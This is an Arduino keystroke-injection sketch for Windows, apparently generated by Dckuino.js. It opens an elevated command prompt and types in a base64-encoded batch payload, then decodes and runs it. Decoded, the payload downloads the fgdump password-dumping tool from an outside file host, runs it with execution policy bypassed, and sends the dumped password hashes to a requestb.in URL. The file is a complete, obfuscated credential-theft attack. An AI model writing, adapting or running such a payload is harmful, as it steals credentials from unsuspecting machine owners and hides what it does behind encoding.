/*
 * Generated with <3 by Dckuino.js, an open source project !
 */



void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  delay(400);

  typeKey(KEY_LEFT_GUI);

  delay(2000);

  Keyboard.print("cmd");

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(2000);

  typeKey(KEY_LEFT_ARROW);

  delay(2000);

  typeKey(KEY_RETURN);

  delay(2000);

  Keyboard.print("cd / & mkdir win & cd win");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("echo Y2QgL3dpbiAmIGVjaG8gKHdnZXQgJ2h0dHA6Ly9kZGw3LmRhdGEuaHUvZ2V0LzMwMTkzNS8xMDQxOTM1NC9mZ2R1bXAuemlwJyAtT3V0RmlsZSBvdXQuZXhlKSA+IHRlc3QuUFMxICYgcG93ZXJzaGVsbCAtRXhlY3V0aW9uUG9saWN5IEJ5UGFzcyAtRmlsZSB0ZXN0LnBzMSAmIFNUQVJUIC9CIG91dC5leGUgJiBwaW5nIDEyNy4wLjAuMSAtbiA0ID4gbnVsICYgZWNobyAoJHBhc3NlcyA9IEdldC1Db250ZW50IGM6XHdpblwxMjcuMC4wLjEucHdkdW1wKTsoJHVybCA9ICdodHRwOi8vcmVxdWVzdGIuaW4vMTc0eXN4ODE/cD0nICsgJHBhc3Nlcyk7KHdnZXQgJHVybCkgPiByZXF1ZXN0LlBTMSAmIHBvd2Vyc2hlbGwgLUV4ZWN1dGlvblBvbGljeSBCeVBhc3MgLUZpbGUgcmVxdWVzdC5wczEgJiBleGl0 > base.txt");

  typeKey(KEY_RETURN);

  delay(2000);

  Keyboard.print("certutil -decode base.txt run.bat");

  typeKey(KEY_RETURN);

  delay(1500);

  Keyboard.print("START /MIN run.bat");

  typeKey(KEY_RETURN);

  delay(2000);

  Keyboard.print("exit");

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
